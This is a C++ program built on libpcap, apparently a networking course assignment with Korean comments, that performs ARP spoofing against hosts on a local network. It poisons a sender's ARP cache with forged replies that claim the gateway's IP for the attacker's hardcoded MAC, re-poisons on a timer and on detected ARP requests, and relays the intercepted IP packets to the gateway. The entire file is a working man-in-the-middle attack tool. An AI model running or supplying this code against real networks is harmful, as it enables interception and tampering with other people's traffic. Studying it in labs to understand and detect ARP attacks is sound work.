#include <cstdio>
#include <cstring>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include <ctime>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

struct IpHdr final {
    uint8_t  version_;
    uint8_t  tos_;
    uint16_t tot_len_;
    uint16_t id_;
    uint16_t frag_off_;
    uint8_t  ttl_;
    uint8_t  protocol_;
    uint16_t check_;
    Ip       sip_;
    Ip       dip_;
};

struct EthIpPacket final {
    EthHdr eth_;
    IpHdr  ip_;
};

struct SpoofFlow {
    Ip senderIp;
    Ip targetIp;
    Mac senderMac;
    Mac targetMac;
    time_t lastSpoof;
};

Mac getMacByIp(pcap_t* handle, Mac myMac, Ip myIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::Size;
    packet.arp_.pln_  = Ip::Size;
    packet.arp_.op_   = htons(ArpHdr::Request);
    packet.arp_.smac_ = myMac;
    packet.arp_.sip_  = htonl(myIp);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_  = htonl(targetIp);

    pcap_sendpacket(handle, (const u_char*)&packet, sizeof(packet));

    while (true) {
        struct pcap_pkthdr* header;
        const u_char* reply;
        int res = pcap_next_ex(handle, &header, &reply);
        if (res != 1) continue;

        EthArpPacket* arp = (EthArpPacket*)reply;
        if (ntohs(arp->eth_.type_) == EthHdr::Arp && ntohs(arp->arp_.op_)   == ArpHdr::Reply &&ntohl(arp->arp_.sip_)  == targetIp) {
            return arp->arp_.smac_; // Arp reply이며 source IP가 target IP인 패킷에서 MAC 주소를 가져옴
        }
    }
}

// ARP spoofing reply 패킷을 보내는 함수
void sendArpSpoof(pcap_t* handle, Mac myMac, Mac senderMac, Ip senderIp, Ip targetIp) {
    EthArpPacket packet;
    packet.eth_.dmac_ = senderMac;
    packet.eth_.smac_ = myMac;
    packet.eth_.type_ = htons(EthHdr::Arp);

    packet.arp_.hrd_  = htons(ArpHdr::ETHER);
    packet.arp_.pro_  = htons(EthHdr::Ip4);
    packet.arp_.hln_  = Mac::Size;
    packet.arp_.pln_  = Ip::Size;
    packet.arp_.op_   = htons(ArpHdr::Reply);
    packet.arp_.smac_ = myMac;              // gateway인 척 내 MAC을 알려줌
    packet.arp_.sip_  = htonl(targetIp);    // gateway의 IP
    packet.arp_.tmac_ = senderMac;
    packet.arp_.tip_  = htonl(senderIp);

    pcap_sendpacket(handle, (const u_char*)&packet, sizeof(packet));
}

void usage() {
    printf("syntax: send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
    printf("sample: send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    char* dev = argv[1];
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1000, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
        return EXIT_FAILURE;
    }

    Mac myMac = Mac("a0:47:d7:d0:28:7d");             // 하드코딩 : 공격자 MAC 주소
    Ip  myIp  = Ip("172.20.10.10");   // 하드코딩 : 공격자 IP 주소

    int pairs = (argc - 2) / 2;
    int spoofInterval = 10;

    SpoofFlow* flows = new SpoofFlow[pairs];

    for (int i = 0; i < pairs; i++) {
        flows[i].senderIp = Ip(argv[2 + 2 * i]);
        flows[i].targetIp = Ip(argv[2 + 2 * i + 1]);

        printf("[*] Resolving MAC for sender %s ...\n", std::string(flows[i].senderIp).c_str());
        flows[i].senderMac = getMacByIp(pcap, myMac, myIp, flows[i].senderIp);
        printf("[+] Sender MAC: %s\n", std::string(flows[i].senderMac).c_str());

        printf("[*] Resolving MAC for gateway %s ...\n", std::string(flows[i].targetIp).c_str());
        flows[i].targetMac = getMacByIp(pcap, myMac, myIp, flows[i].targetIp);
        printf("[+] Gateway MAC: %s\n", std::string(flows[i].targetMac).c_str());

        sendArpSpoof(pcap, myMac, flows[i].senderMac, flows[i].senderIp, flows[i].targetIp);
        flows[i].lastSpoof = time(nullptr);
    }

        // =============================================
        //  3단계: 패킷 캡처 + relay 루프
        // =============================================
    printf("[*] Starting relay loop...\n");

    while (true) {
        time_t now = time(nullptr);

        // 시간 기반 재감염(시간 : 10초)

        for (int i = 0; i < pairs; i++) {
            if (now - flows[i].lastSpoof >= spoofInterval) {
                sendArpSpoof(pcap, myMac, flows[i].senderMac, flows[i].senderIp, flows[i].targetIp);
                flows[i].lastSpoof = now;
            }
        }

        // -----------------------------------------
        // Case 1. ARP 시간이 지나서 다시 물어보면 -> 즉시 재감염 (broadcast ARP Request 감지) 
        // 만약 중간에 sender가 gateway MAC을 다시 물어보는 ARP request를 보내면, 그때도 재감염
        // -----------------------------------------

        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res != 1) continue;

        EthHdr* eth = (EthHdr*)packet;

        if (ntohs(eth->type_) == EthHdr::Arp) {
            ArpHdr* arp = (ArpHdr*)(packet + sizeof(EthHdr));

            for (int i = 0; i < pairs; i++) {
                if (ntohs(arp->op_) == ArpHdr::Request &&
                    ntohl(arp->sip_) == flows[i].senderIp &&
                    ntohl(arp->tip_) == flows[i].targetIp) {
                    sendArpSpoof(pcap, myMac, flows[i].senderMac, flows[i].senderIp, flows[i].targetIp);
                    flows[i].lastSpoof = now;
                }
            }
            continue;
        }

        // -----------------------------------------
        // Case 2: sender가 보낸 IP 패킷 감지 => Ethernet Mac을 바꿔서 gatewary로 forward
        // -----------------------------------------
        if (ntohs(eth->type_) == EthHdr::Ip4) {
            if (eth->smac_ == myMac) continue;  // 여기!

            for (int i = 0; i < pairs; i++) {
                if (eth->smac_ != flows[i].senderMac) continue;
                if (eth->dmac_ != myMac) continue;

                uint32_t packetLen = header->caplen;
                u_char* relayPacket = new u_char[packetLen];
                memcpy(relayPacket, packet, packetLen);

                EthHdr* relayEth = (EthHdr*)relayPacket;
                relayEth->dmac_ = flows[i].targetMac;
                relayEth->smac_ = myMac;

                res = pcap_sendpacket(pcap, relayPacket, packetLen);
                if (res != 0) {
                    fprintf(stderr, "relay failed: %s\n", pcap_geterr(pcap));
                }

                delete[] relayPacket;
                break;
            }
        }
    }
    
    delete[] flows;
    pcap_close(pcap);
    return 0;
}
